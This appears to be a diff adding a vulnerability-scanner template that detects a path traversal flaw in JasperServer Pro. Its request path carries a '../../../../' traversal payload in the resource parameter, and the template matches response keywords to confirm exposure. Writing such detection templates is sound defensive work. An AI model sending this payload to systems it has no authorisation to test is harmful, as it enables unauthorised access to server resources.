@@ -1,0 +1,19 @@
+id: custom-jasper-path-traversal-detect
+
+info:
+  name: Custom Jasper Path Traversal Detect
+  author: pdteam
+  severity: medium
+  tags: config,exposure
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/jasperserver-pro/reportresource/reportresource/?resource=net/sf/jasperreports/../../../../'
+    matchers:
+      - type: word
+        words:
+          - 'actionModel'
+          - 'adhoc'
+        condition: and
+
